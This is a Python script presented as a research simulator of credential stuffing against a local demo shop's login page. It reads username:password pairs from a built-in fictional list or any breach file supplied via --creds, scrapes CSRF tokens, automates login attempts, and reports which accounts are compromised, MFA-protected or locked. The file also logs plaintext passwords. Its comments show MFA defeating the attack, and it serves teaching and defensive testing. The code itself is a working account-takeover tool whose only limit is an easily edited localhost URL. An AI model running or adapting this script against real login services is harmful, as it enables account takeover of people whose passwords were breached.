#!/usr/bin/env python3
"""
credential_stuffing.py — Credential Stuffing Attack Simulator
==============================================================
Cybersecurity Research Tool | LuxCarry Demo Platform

PURPOSE:
    Simulates a credential stuffing attack using a list of
    username:password pairs (as might be obtained from a data breach).

    Demonstrates:
      - Without MFA: stolen credentials from other breaches grant access
      - With MFA:    stolen credentials are useless without the OTP
      - Rate limiting: login lockout slows or blocks the attack

USAGE:
    python3 credential_stuffing.py
    python3 credential_stuffing.py --creds leaked_creds.txt --delay 1.0
    python3 credential_stuffing.py --help

CREDENTIAL FILE FORMAT (--creds):
    username1:password1
    username2:password2
    ...

WARNING:
    For LOCAL research on localhost only.
    Using this against systems you do not own is ILLEGAL and unethical.
"""

import requests
import argparse
import time
import json
import re
from datetime import datetime
from pathlib import Path

# ── Configuration ──────────────────────────────────────────────────────────────
BASE_URL  = "http://localhost/luxury-handbag-website"
LOGIN_URL = f"{BASE_URL}/auth/login.php"
LOG_FILE  = Path(__file__).parent.parent / "logs" / "attack_credential_stuffing.log"
DELAY_SEC = 0.8
TIMEOUT   = 5

# ── Simulated leaked credential database ─────────────────────────────────────
# In a real attack, these would come from public breach dumps.
# Here we use fictional data for research demonstration.
DEMO_CREDENTIALS = [
    # (username, password)  — from "other site breaches"
    ("john_doe",     "password123"),
    ("jane_smith",   "qwerty2020"),
    ("admin",        "admin"),
    ("testuser",     "test123"),
    ("demo_user",    "wrongpassword"),
    ("demo_user",    "demo123"),          # ← Imagine this is the real password
    ("alice",        "alice2023"),
    ("bob_dev",      "bobspassword"),
    ("mike_r",       "MikeR#2022"),
    ("sarah_k",      "sk_fashion99"),
    ("research",     "research2024"),     # ← Research account
]


def log_attempt(username: str, password: str, result: str, stage: str):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = (
        f"[{timestamp}] | USERNAME: {username:<20} | IP: {'127.0.0.1':<15} | "
        f"STAGE: {stage:<10} | RESULT: {result} | PASSWORD: {password}\n"
    )
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(line)


def get_csrf_token(session: requests.Session) -> str:
    try:
        response = session.get(LOGIN_URL, timeout=TIMEOUT)
        match = re.search(r'name=["\']csrf_token["\'] value=["\']([a-f0-9]+)["\']', response.text)
        return match.group(1) if match else ""
    except requests.RequestException:
        return ""


def attempt_login(session: requests.Session, username: str, password: str) -> dict:
    csrf = get_csrf_token(session)
    if not csrf:
        return {"success": False, "mfa_required": False, "locked": False}

    try:
        response = session.post(
            LOGIN_URL,
            data={"username": username, "password": password, "csrf_token": csrf},
            timeout=TIMEOUT,
            allow_redirects=True,
        )
        text = response.text.lower()
        url  = response.url

        return {
            "success":      "dashboard" in url,
            "mfa_required": "verify_otp" in url or "two-factor" in text,
            "locked":       "account locked" in text,
            "url":          url,
        }
    except requests.RequestException as e:
        return {"success": False, "mfa_required": False, "locked": False, "error": str(e)}


def run_credential_stuffing(credentials: list[tuple], delay: float = DELAY_SEC):
    """Run the credential stuffing simulation."""
    session = requests.Session()
    session.headers.update({"User-Agent": "CredStuffSim/1.0 (Research)"})

    stats = {
        "total": 0, "failed": 0, "locked": 0,
        "mfa_blocked": 0, "compromised": 0,
        "valid_creds": [],
    }

    print("\n" + "═" * 65)
    print("  🗂️  CREDENTIAL STUFFING ATTACK SIMULATOR")
    print("  Endpoint  :", LOGIN_URL)
    print("  Cred pairs:", len(credentials))
    print("  Strategy  : Try each username:password from breach database")
    print("  Goal      : Find accounts reusing breached passwords")
    print("═" * 65)
    print(f"\n  {'#':<5} {'Username':<20} {'Password':<22} {'Result'}")
    print("  " + "─" * 60)

    for i, (username, password) in enumerate(credentials, 1):
        result = attempt_login(session, username, password)
        stats["total"] += 1

        if result.get("locked"):
            status = "⛔ LOCKED"
            outcome = "ACCOUNT_LOCKED"
            stats["locked"] += 1

        elif result.get("mfa_required"):
            status = "🛡️  MFA BLOCKED ← Protected!"
            outcome = "MFA_BLOCKED"
            stats["mfa_blocked"] += 1
            stats["valid_creds"].append((username, password, "mfa_blocked"))

        elif result.get("success"):
            status = "✅ COMPROMISED! ← Access granted"
            outcome = "COMPROMISED"
            stats["compromised"] += 1
            stats["valid_creds"].append((username, password, "full_access"))

        else:
            status = "✗ Invalid"
            outcome = "FAILURE"
            stats["failed"] += 1

        print(f"  [{i:>3}] {username:<20} {password:<22} {status}")
        log_attempt(username, password, outcome, "PASSWORD")
        time.sleep(delay)

    # ── Print Summary ──────────────────────────────────────────
    print("\n" + "═" * 65)
    print("  CREDENTIAL STUFFING — RESULTS SUMMARY")
    print("─" * 65)
    print(f"  Total pairs tested  : {stats['total']}")
    print(f"  Failed (wrong creds): {stats['failed']}")
    print(f"  Account locked      : {stats['locked']}")
    print(f"  MFA-blocked pairs   : {stats['mfa_blocked']}  ← MFA protection works!")
    print(f"  Compromised accounts: {stats['compromised']}")
    print()

    if stats["valid_creds"]:
        print("  Valid credential pairs found:")
        for u, p, outcome in stats["valid_creds"]:
            icon = "🛡️ MFA" if outcome == "mfa_blocked" else "⚠️  FULL ACCESS"
            print(f"    {icon} → {u}:{p}")

    print()
    if stats["compromised"] > 0:
        print("  ❌ RESULT: Some accounts COMPROMISED.")
        print("     → Enable MFA to protect against credential stuffing!")
    elif stats["mfa_blocked"] > 0:
        print("  ✅ RESULT: Correct passwords found but MFA defeated the attack.")
        print("     → TOTP MFA is effective against credential stuffing attacks.")
    else:
        print("  ✅ RESULT: No valid credentials matched this target.")

    print("─" * 65)

    # ── Research Explanation ───────────────────────────────────
    print("""
  📚 HOW CREDENTIAL STUFFING WORKS:
  ─────────────────────────────────
  1. Attacker obtains username/password pairs from data breaches
     (e.g., LinkedIn, Adobe, Yahoo breaches — all public on dark web)

  2. Many users reuse passwords across multiple sites

  3. Attacker automates login attempts using the leaked credentials

  4. WITHOUT MFA: Any matching credential grants access immediately

  5. WITH MFA (TOTP): Correct credentials still fail because the
     attacker doesn't have the rotating 6-digit OTP from the
     victim's phone — making the stolen credentials useless.

  CONCLUSION: MFA defeats credential stuffing even when passwords
              have been compromised in third-party breaches.
""")

    # Save results
    results_file = LOG_FILE.parent / "credential_stuffing_results.json"
    with open(results_file, "w") as f:
        json.dump({**stats, "timestamp": datetime.now().isoformat()}, f, indent=2, default=str)

    print(f"  📄 Log   : {LOG_FILE}")
    print(f"  📊 JSON  : {results_file}\n")
    return stats


def load_credentials_from_file(filepath: str) -> list[tuple]:
    """Parse username:password file."""
    creds = []
    path = Path(filepath)
    if not path.exists():
        raise FileNotFoundError(f"Credential file not found: {filepath}")
    for line in path.read_text().splitlines():
        line = line.strip()
        if ":" in line and not line.startswith("#"):
            parts = line.split(":", 1)
            creds.append((parts[0].strip(), parts[1].strip()))
    return creds


def main():
    parser = argparse.ArgumentParser(
        description="Credential Stuffing Simulator — Research Tool (localhost only)"
    )
    parser.add_argument("--creds",  "-c", help="Path to username:password file (one per line)")
    parser.add_argument("--delay",  "-d", type=float, default=DELAY_SEC,
                        help=f"Delay between attempts (default: {DELAY_SEC}s)")
    args = parser.parse_args()

    if args.creds:
        try:
            credentials = load_credentials_from_file(args.creds)
            print(f"  Loaded {len(credentials)} credential pairs from {args.creds}")
        except (FileNotFoundError, ValueError) as e:
            print(f"Error: {e}")
            return
    else:
        print("  Using built-in demo credential list (simulating a breach dump).")
        credentials = DEMO_CREDENTIALS

    run_credential_stuffing(credentials, args.delay)


if __name__ == "__main__":
    main()
